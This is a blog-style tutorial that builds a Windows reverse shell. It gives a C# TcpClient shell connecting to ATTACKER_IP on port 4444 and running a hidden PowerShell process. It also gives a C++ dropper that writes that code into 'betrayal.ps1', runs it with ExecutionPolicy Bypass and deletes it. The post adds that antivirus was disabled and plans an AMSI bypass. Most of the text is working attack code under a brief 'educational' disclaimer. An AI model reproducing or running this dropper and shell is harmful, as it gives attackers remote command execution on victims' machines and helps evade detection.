---
layout: post
title:  "Cpp & Powershell & CSharp - Reverse Shell (Detectable)"
categories: [cplusplus]
pin: true
tags: [csharp,trojan,cpp,powershell,Reverse Shell]
---

*Only for Educational purpose*

## Executing C# code using PowerShell script

Here the example : [executing c# using powershell](https://blog.adamfurmanek.pl/2016/03/19/executing-c-code-using-powershell-script/)

```csharp
$code = @"
using System;
namespace HelloWorld
{
	public class Program
	{
		public static void Main(){
			Console.WriteLine("Hello world!");
		}
	}
}
"@

Add-Type -TypeDefinition $code -Language CSharp
iex "[HelloWorld.Program]::Main()"
```

![image]( /assets/img/revshell/4.PNG)

## The Reverse Shell in CSharp

Find it here : [Simple CSharp Reverse Shell](https://www.puckiestyle.nl/c-simple-reverse-shell/)

```csharp
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace HelloWorld
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main()
		{
			using(TcpClient client = new TcpClient("ATTACKER_IP", 4444))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "powershell.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception) { }
            }
        }

	}
}
```

## C++ Program

- Use this to format your code : [cpp text escape](https://tomeko.net/online_tools/cpp_text_escape.php?lang=en)

```cpp
// Created by Alienum
#include <iostream>
#include <windows.h>
#include <fstream>

using namespace std;

int main()
{

    ofstream file;
    file.open("betrayal.ps1");

    string powershell;


    powershell = "$code = @\"\n";
    powershell += "using System;\n";
    powershell += "using System.Text;\n";
    powershell += "using System.IO;\n";
    powershell += "using System.Diagnostics;\n";
    powershell += "using System.ComponentModel;\n";
    powershell += "using System.Linq;\n";
    powershell += "using System.Net;\n";
    powershell += "using System.Net.Sockets;\n";
    powershell += "\n";
    powershell += "\n";
    powershell += "namespace HelloWorld\n";
    powershell += "{\n";
    powershell += "\tpublic class Program\n";
    powershell += "\t{\n";
    powershell += "\t\tstatic StreamWriter streamWriter;\n";
    powershell += "\n";
    powershell += "\t\tpublic static void Main()\n";
    powershell += "\t\t{\n";
    powershell += "\t\t\tusing(TcpClient client = new TcpClient(\"ATTACKER_IP\", 4444))\n";
    powershell += "\t\t\t{\n";
    powershell += "\t\t\t\tusing(Stream stream = client.GetStream())\n";
    powershell += "\t\t\t\t{\n";
    powershell += "\t\t\t\t\tusing(StreamReader rdr = new StreamReader(stream))\n";
    powershell += "\t\t\t\t\t{\n";
    powershell += "\t\t\t\t\t\tstreamWriter = new StreamWriter(stream);\n";
    powershell += "\t\t\t\t\t\t\n";
    powershell += "\t\t\t\t\t\tStringBuilder strInput = new StringBuilder();\n";
    powershell += "\n";
    powershell += "\t\t\t\t\t\tProcess p = new Process();\n";
    powershell += "\t\t\t\t\t\tp.StartInfo.FileName = \"powershell.exe\";\n";
    powershell += "\t\t\t\t\t\tp.StartInfo.CreateNoWindow = true;\n";
    powershell += "\t\t\t\t\t\tp.StartInfo.UseShellExecute = false;\n";
    powershell += "\t\t\t\t\t\tp.StartInfo.RedirectStandardOutput = true;\n";
    powershell += "\t\t\t\t\t\tp.StartInfo.RedirectStandardInput = true;\n";
    powershell += "\t\t\t\t\t\tp.StartInfo.RedirectStandardError = true;\n";
    powershell += "\t\t\t\t\t\tp.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n";
    powershell += "\t\t\t\t\t\tp.Start();\n";
    powershell += "\t\t\t\t\t\tp.BeginOutputReadLine();\n";
    powershell += "\n";
    powershell += "\t\t\t\t\t\twhile(true)\n";
    powershell += "\t\t\t\t\t\t{\n";
    powershell += "\t\t\t\t\t\t\tstrInput.Append(rdr.ReadLine());\n";
    powershell += "\t\t\t\t\t\t\t//strInput.Append(\"\\n\");\n";
    powershell += "\t\t\t\t\t\t\tp.StandardInput.WriteLine(strInput);\n";
    powershell += "\t\t\t\t\t\t\tstrInput.Remove(0, strInput.Length);\n";
    powershell += "\t\t\t\t\t\t}\n";
    powershell += "\t\t\t\t\t}\n";
    powershell += "\t\t\t\t}\n";
    powershell += "\t\t\t}\n";
    powershell += "\t\t}\n";
    powershell += "\n";
    powershell += "\t\tprivate static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)\n";
    powershell += "        {\n";
    powershell += "            StringBuilder strOutput = new StringBuilder();\n";
    powershell += "\n";
    powershell += "            if (!String.IsNullOrEmpty(outLine.Data))\n";
    powershell += "            {\n";
    powershell += "                try\n";
    powershell += "                {\n";
    powershell += "                    strOutput.Append(outLine.Data);\n";
    powershell += "                    streamWriter.WriteLine(strOutput);\n";
    powershell += "                    streamWriter.Flush();\n";
    powershell += "                }\n";
    powershell += "                catch (Exception) { }\n";
    powershell += "            }\n";
    powershell += "        }\n";
    powershell += "\n";
    powershell += "\t}\n";
    powershell += "}\n";
    powershell += "\"@";

    powershell += "\nAdd-Type -TypeDefinition $code -Language CSharp\n";
    powershell += "iex \"[HelloWorld.Program]::Main()\"";
    file << powershell << endl;
    file.close();

    system("powershell -ExecutionPolicy Bypass -F betrayal.ps1");

    remove("betrayal.ps1");

    return 0;
}
```

## Short Explain

- This line will run the charp code

```cpp
powershell += "\nAdd-Type -TypeDefinition $code -Language CSharp\n";
powershell += "iex \"[HelloWorld.Program]::Main()\"";
```

- This line will run the generated `betrayal.ps1`

```cpp
system("powershell -ExecutionPolicy Bypass -F betrayal.ps1");
```

## Virus & Threat protection

- The malicious `betrayal.ps1` program is Detectable so i had to disable the AV

![image]( /assets/img/revshell/3.PNG)

## Run the C++ Program

-  I use the CodeBlocks Platform

![image]( /assets/img/revshell/1.PNG)

## The Generated betrayal.ps1

```csharp
$code = @"
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace HelloWorld
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main()
		{
			using(TcpClient client = new TcpClient("ATTACKER_IP", 4444))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "powershell.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception) { }
            }
        }

	}
}
"@
Add-Type -TypeDefinition $code -Language CSharp
iex "[HelloWorld.Program]::Main()"
```

## Reverse shell

![image]( /assets/img/revshell/betrayal.PNG)

## Future Thoughts

- Creating undetectable reverse shell (AMSI Bypass)
